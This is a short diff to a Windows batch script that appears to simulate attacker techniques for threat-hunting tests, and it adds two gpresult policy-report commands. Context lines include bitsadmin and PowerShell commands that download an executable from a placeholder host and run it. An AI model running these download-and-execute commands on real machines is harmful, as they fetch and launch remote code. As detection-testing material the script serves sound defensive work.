@@ -487,6 +487,10 @@ cmd.exe /c bitsadmin /transfer TW /priority foreground https://example.com/apt.e
 ECHO ============================
 powershell $b = $env:temp + '\RJklmtiTre.exe';WGet 'http://testsite/apt.exe' -outFiLe $b;start $b
 ECHO ============================
+gpresult /z
+ECHO ============================
+gpresult /H gpreport.html
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
